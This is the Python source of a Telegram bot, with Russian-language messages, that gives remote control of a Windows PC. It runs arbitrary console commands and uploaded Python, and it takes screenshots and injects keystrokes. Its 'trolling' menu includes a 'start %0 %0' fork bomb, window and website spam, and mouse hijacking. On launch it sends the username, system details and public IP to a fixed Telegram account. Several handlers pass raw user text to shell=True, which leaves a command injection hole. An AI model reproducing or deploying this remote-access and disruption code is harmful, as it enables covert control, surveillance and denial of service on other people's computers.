        bot.send_message(message.chat.id, '✍️ *Введите информацию по форме ниже:\nnickname,ip,port\nПример: Little_Bot,127.0.0.1,7777*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, raklite_connect)

    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return samp_menu(message)


def samp_connect(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return samp_menu(message)

    try:
        bot.send_message(message.chat.id, f'☑️ Подключаемся к серверу с IP *{ message.text.strip()}*...', parse_mode = "Markdown")
        samp_menu(message)
        return subprocess.Popen(f'{SAMP_ROUTE}\samp.exe {message.text.strip()}', shell=True)
        
    except: bot.send_message(message.chat.id, '❌ Произошла ошибка! Проверьте ваш settings.ini', parse_mode = "Markdown")
    return samp_menu(message)

def raklite_connect(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return samp_menu(message)

    info = message.text.strip().split(',') # ник,ip,port
    if len(info) != 3:
        bot.send_message(message.chat.id, '*❌ Вы не дописали все аргументы! Проверьте ваше сообщение и повторите попытку позже*', parse_mode = "Markdown")
        return samp_menu(message)

    bot.send_message(message.chat.id, f'☑️ Подключаемся к *{info[1]}:{info[2]}*', parse_mode = "Markdown")
    samp_menu(message)

    try: return subprocess.Popen(f'"{RAKLITE_ROUTE}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z', shell=True)
    except:
        bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
        return samp_menu(message)


def other_functions(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Перезагрузка ПК", "Выход из учетки ПК", "Выключение ПК",
                                                                                             "Фикс раздвоения", "Выход из скрипта", "Удаление папки со скриптом", "Назад")
    bot.send_message(message.chat.id, '🔑 *Выберите нужную функцию!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_other)


def check_other(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return mainmenu(message)
    elif message.text.strip() == 'Удаление папки со скриптом': return full_delete(message)
    elif message.text.strip() == 'Выход из скрипта': return script_exit(message)
    elif message.text.strip() == 'Выход из учетки ПК': return logout(message)
    elif message.text.strip() == 'Перезагрузка ПК': return reboot(message)
    elif message.text.strip() == 'Выключение ПК': return off_computer(message)
    elif message.text.strip() == 'Фикс раздвоения':
        bot.send_message(message.chat.id, '😢 *Не забудьте написать /start*', parse_mode='Markdown')
        return 1/0
        
    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return other_functions(message)


def reboot(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
    bot.send_message(message.chat.id, '😢 *Подтвердите перезагрузку ПК!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, reboot_check)

def reboot_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Да, подтверждаю':
        bot.send_message(message.chat.id, '☑️ *Вы успешно вызвали перезагрузку ПК\nОна произойдет после редиректа в главное меню*', parse_mode='Markdown')
        mainmenu()
        bot.send_message(message.chat.id, "☑️ *Перезагрузка запущена!*")
        return subprocess.run('shutdown -r -t 0')

    bot.send_message(message.chat.id, '🎉 *Вы отменили перезагрузку ПК!*', parse_mode='Markdown')
    return other_functions(message)


def off_computer(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
    bot.send_message(message.chat.id, '😢 *Подтвердите выключение ПК!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, off_computer_check)

def off_computer_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Да, подтверждаю':
        bot.send_message(message.chat.id, '☑️ *Вы успешно вызвали выключение ПК\nОно произойдет после редиректа в главное меню*', parse_mode='Markdown')
        mainmenu()
        bot.send_message(message.chat.id, "☑️ *Выключение запущено!*")
        return subprocess.Popen('shutdown /s /t 0', shell=True)

    bot.send_message(message.chat.id, '🎉 *Вы отменили выключение ПК!*', parse_mode='Markdown')
    return other_functions(message)


def logout(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
    bot.send_message(message.chat.id, '😢 *Подтвердите выход из учетной записи!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, logout_check)

def logout_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Да, подтверждаю':
        bot.send_message(message.chat.id, '☑️ *Вы успешно вышли из учетной записи*', parse_mode='Markdown')
        return subprocess.run('shutdown /l')

    bot.send_message(message.chat.id, '🎉 *Вы отменили выход из учетной записи!*', parse_mode='Markdown')
    return other_functions(message)


def script_exit(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Да, подтверждаю", "Нет, я передумал")
    bot.send_message(message.chat.id, '😢 *Подтвердите выключение скрипта!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_exit)

def check_exit(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Да, подтверждаю':
        bot.send_message(message.chat.id, '😥 *Вы завершили работу скрипта!*', parse_mode='Markdown')
        return os.abort()

    bot.send_message(message.chat.id, '🎉 *Вы отменили завершение работы скрипта!*', parse_mode='Markdown')
    return other_functions(message)


def packs(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Открытие сайтов", "Открытие проводника", "Перемещение мышки", "start %0 %0", "Назад")
    bot.send_message(message.chat.id, '👺 *Вы в меню троллинга!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_packs)

def check_packs(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return mainmenu(message)
    elif message.text.strip() == 'start %0 %0':
        if os.path.exists('C:\\temp\\') == False: make_temp_folder()
        with open("C:\\temp\\troll.bat", "w") as file: file.write('start %0 %0')
        os.startfile("C:\\temp\\troll.bat")
        bot.send_message(message.chat.id, '☑️ *start %0 %0 успешно запущен!*', parse_mode='Markdown')
        return packs(message)

    elif message.text.strip() == 'Открытие сайтов':
        bot.send_message(message.chat.id, '✍️ *Введите сколько раз вы хотите открыть сайты!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, troll_site)
    elif message.text.strip() == 'Открытие проводника':
        bot.send_message(message.chat.id, '✍️ *Введите сколько раз вы хотите открыть проводник!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, troll_provod)
    elif message.text.strip() == 'Перемещение мышки':
        bot.send_message(message.chat.id, '✍️ *Введите сколько секунд вы хотите перемещать мышь!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, mouse_troll)

    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return packs(message)


def mouse_troll(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    xmouse = message.text.strip()
    if xmouse == "/start": return start(message)
    if xmouse.isdigit() == False:
        bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
        return packs(message)

    bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xmouse} секунд!*', parse_mode='Markdown')
    packs(message)

    for i in range(int(xmouse)): 
        for i in range(10): pyautogui.moveTo(randint(0, width), randint(0, height), duration=0.10)
    
    return bot.send_message(message.chat.id, '☑️ *Скрипт на перемещение мышки успешно выполнился!*', parse_mode='Markdown')



def troll_provod(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    xexplorer = message.text.strip()
    if xexplorer == "/start": return start(message)
    if xexplorer.isdigit() == False:
        bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
        return packs(message)

    bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xexplorer} раз!*', parse_mode='Markdown')
    packs(message)

    for i in range(int(xexplorer)): keyboard.send("win+e")
    return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие проводника успешно выполнился!*', parse_mode='Markdown')


def troll_site(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    xsite = message.text.strip()
    if xsite == "/start": return start(message)
    if xsite.isdigit() == False:
        bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
        return packs(message)

    bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xsite} раз!*', parse_mode='Markdown')
    packs(message)

    for i in range(int(xsite)):
        for i in TROLL_WEBSITES: webopen(i, new=1)

    return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие сайтов успешно выполнился!*', parse_mode='Markdown')


def full_delete(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
    return bot.register_next_step_handler(message, full_delete_open)

def full_delete_open(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "/start": return start(message)
    if os.path.exists('C:\\temp') == False: make_temp_folder()
    with open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8") as file: file.write(message.text.strip())
    subprocess.Popen("python C:\\temp\\DeleteFile.py", shell=True)
    return other_functions(message)


def pc_settings(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Изменить яркость", "Информация о ПК", "Назад")
    bot.send_message(message.chat.id, '🔧 *Вы в меню настроек ПК!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, pc_settings_check)

def pc_settings_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return mainmenu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Изменить яркость': return brightness_set(message)
    elif message.text.strip() == 'Информация о ПК':
        conn = HTTPConnection("ifconfig.me")
        try:
            conn.request("GET", "/ip")
            ip = conn.getresponse().read()
        except:
            ip = "Неизвестно"

        total_mem, used_mem, free_mem = disk_usage('.')
        gb = 10 ** 9
        login = os.getlogin()
        width, height = pyautogui.size()
        oper = uname()
            
        try: virtual_memory = psutil.virtual_memory()
        except: virtual_memory = 'нет информации'
        try: battery = psutil.sensors_battery()[0]
        except: battery = 'нет информации'
        active_window = getActiveWindowTitle()

        if active_window == None or active_window == '': active_window = 'Рабочий стол'
        bot.send_message(FIRST_ID, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n😻 Оперативная память: *Доступно {int(virtual_memory[0] / 1e+9)} ГБ | Загружено {virtual_memory[2]}%*\n🔋 Батарея заряжена на *{battery}%*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f'\n🔑 IP адрес запустившего - *{str(ip)[2:-1]}*\n*🖼 Активное окно - {active_window}*', parse_mode="Markdown")
        return pc_settings(message)

    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return pc_settings(message)

def brightness_set(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")

    bot.send_message(message.chat.id, f'🔧 *Введите уровень яркости(5-100)!\n\nТекущий уровень - {get_brightness()}*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_brightness_set)

def check_brightness_set(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    level = message.text.strip()
    if level  == 'Назад': return pc_settings(message)
    elif level == '/start': return start(message)
    elif message.text.strip().isdigit() == False:
        bot.send_message(message.chat.id, f'❌ *Уровень яркости должен быть числом!*', parse_mode='Markdown')
        return pc_settings(message)

    if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'❌ *Уровень должен быть больше 0 и меньше 100!*', parse_mode='Markdown')
        
    set_brightness(int(level))
    bot.send_message(message.chat.id, f'❌ *Вы успешно установили уровень яркости {level}!*', parse_mode='Markdown')
    return pc_settings(message)

#Бинд API
class bindAPI:
    def setWait(self, duration):
        try: sleep(int(duration))
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция setWait, длительность задержки = {duration}*", parse_mode='Markdown')

    def setCursor(self, x, y):
        try: pyautogui.moveTo(int(x), int(y))
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция setCursor, x = {x}, y = {y}*", parse_mode='Markdown')

    def writeKeyboard(self, text):
        try: keyboard.write(text, 0)
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция writeKeyboard, текст = {text}*", parse_mode='Markdown')

    def useKeyboard(self, combination):
        try: keyboard.send(combination)
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция useKeyboard, комбинация = {combination}*", parse_mode='Markdown')

    def openSite(self, site):
        try: webopen(site)
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openSite, сайт = {site}*", parse_mode='Markdown')

    def sendMessage(self, sendId, text):
        try: bot.send_message(sendId, text)
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция sendMessage, sendId = {sendId}, текст - {text}*", parse_mode='Markdown')

    def openProgram(self, path):
        try: subprocess.Popen(f'"{path}"')
        except FileNotFoundError: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openProgram, path = {path}*, файл не был найден", parse_mode='Markdown')
    

    def clickMouse(self, button):
        try:
            if button == 'r': pyautogui.click(button='right')
            elif button == 'l': pyautogui.click()
            else: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда: неизвестная кнопка! Доступные варианты - r или l\n*Функция clickMouse, button = {button}*", parse_mode='Markdown')

        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция clickMouse, button = {button}*", parse_mode='Markdown')

    def sendScreenshot(self, sendId):
        try:
            pyautogui.screenshot("screen.png")
            bot.send_document(sendId, open("screen.png", 'rb'))
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция sendScreenshot, sendId = {sendId}*", parse_mode='Markdown')

    def useConsole(self, sendId, cmd):
        try:
            if int(sendId) >= 1: bot.send_message(sendId, subprocess.getoutput(cmd, encoding='cp866'))
            else: subprocess.Popen(cmd, shell=True)
        except: return bot.send_message(FIRST_ID, f"⚠️ Произошла ошибка при выполнении бинда! *Функция useConsole, команда = {cmd}, sendId = {sendId}*", parse_mode='Markdown')


def bind_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Создать бинд", "Использовать бинд", "Удалить бинд", "Назад")
    bot.send_message(message.chat.id, '😏 *Вы в меню использования биндов!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_bind_menu)

def check_bind_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start' or message.text.strip() == 'Назад': return mainmenu(message)
    elif message.text.strip() == 'Использовать бинд': return choose_bind(message)
    elif message.text.strip() == 'Создать бинд': return bind_create(message)
    elif message.text.strip() == 'Удалить бинд': return bind_delete(message)

    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return bind_menu(message)


def bind_create(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '😏 *Вы в меню создания биндов!\nВведите имя нового бинда без расширения .bind*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, bind_create_text)

def bind_create_text(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip == "/start": return start(message)
    elif message.text.strip == "Назад": return bind_menu(message)
        
    bot.send_message(message.chat.id, '😏 *Введите код бинда!*', parse_mode='Markdown')
    return bot.register_next_step_handler(message, bind_create_final, message.text.strip())

def bind_create_final(message: types.Message, name: str):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip == "/start": return start(message)
    elif message.text.strip == "Назад": return bind_menu(message)

    try:
        with open(f'binds\\{name}.bind', 'w') as file:
            file.write(message.text)
    
    except OSError:
        bot.send_message(message.chat.id, '😮 *Возникла проблема при записи файла! Проверьте его название*', parse_mode='Markdown')
        return bind_menu(message)
        
    bot.send_message(message.chat.id, '😮 *Бинд успешно создан!*', parse_mode='Markdown')
    return bind_menu(message)


def bind_delete(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '😏 *Вы в меню удаления биндов!\nВведите имя уже существующего бинда для его удаления*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_bind_del)

def check_bind_del(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip == "/start": return start(message)
    elif message.text.strip == "Назад": return bind_menu(message)

    if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
        bot.send_message(message.chat.id, f'🤨 *Удаляю {message.text.strip()}.txt!*', parse_mode='Markdown')
        os.remove(f"binds\\{message.text.strip()}.txt")
        return bind_menu(message)
        
    bot.send_message(message.chat.id, '😮 *Данного бинда не существует!*', parse_mode='Markdown')
    return bind_menu(message)

def choose_bind(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    files_list = []
    for (root, dirs, files) in os.walk('binds', topdown=True):
        files_list = files.copy()

    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '😏 *Вы в меню взаимодействия с биндами!\nВведите имя уже существующего бинда для его открытия*\n\n📌 *Список файлов в папке (бинды заканчиваются на .bind):*\n' + "\n".join(files_list), reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, bind_read)


def bind_read(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip == "/start": return start(message)
    elif message.text.strip == "Назад": return bind_menu(message)

    if os.path.isfile(f"binds\\{message.text.strip()}.bind") == False:
        bot.send_message(message.chat.id, '😮 *Данного бинда не существует!*', parse_mode='Markdown')
        return bind_menu(message)
        
    bind_menu(message)
    bot.send_message(message.chat.id, f'🤨 *Запускаю бинд {message.text.strip()}!*', parse_mode='Markdown')    

    with open(f"binds\\{message.text.strip()}.bind", "r", encoding='utf8') as file:
        text = file.read()
        code = text.split("\n")

    bind_api = bindAPI()

    for i in code:
        try:
            if i.startswith('//') or i == '': continue

            elif i.startswith('wait'): 
                if bind_api.setWait(int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('writeKeyboard'):
                if bind_api.writeKeyboard(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('useKeyboard'):
                if bind_api.useKeyboard(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('openSite'):
                if bind_api.openSite(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('sendScreenshot'):
                if bind_api.sendScreenshot(int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('openProgram'):
                if bind_api.openProgram(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('clickMouse'):
                if bind_api.clickMouse(i.split('=', maxsplit=1)[1]) is not None: break
            
            elif i.startswith('setCursor'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if bind_api.setCursor(int(funcCode[0]), int(funcCode[1])) is not None: break

            elif i.startswith('sendMessage'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if bind_api.sendMessage(int(funcCode[0]), funcCode[1]) is not None: break

            elif i.startswith('useConsole'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if bind_api.useConsole(int(funcCode[0]), funcCode[1]) is not None: break

            else:
                return bot.send_message(FIRST_ID, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nДанной функции не существует!*", parse_mode='Markdown')

        except IndexError: return bot.send_message(FIRST_ID, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nПроверьте аргументы строки!*", parse_mode='Markdown')
        
    return bot.send_message(message.chat.id, '☑️ *Бинд был успешно использован!*', parse_mode='Markdown')

if __name__ == '__main__':
    startup_time = datetime.now()
    message = bot.send_message(FIRST_ID, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n😻 Оперативная память: *Доступно {int(virtual_memory[0] / 1e+9)} ГБ | Загружено {virtual_memory[2]}%*\n🔋 Батарея заряжена на *{battery}%*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f'\n🔑 IP адрес запустившего - *{str(ip)[2:-1]}*', parse_mode="Markdown")
    mainmenu(message)
    print(f"{startup_time} | Управление компьютером v.{VERSION} успешно запущено!")
    bot.infinity_polling(none_stop = True)
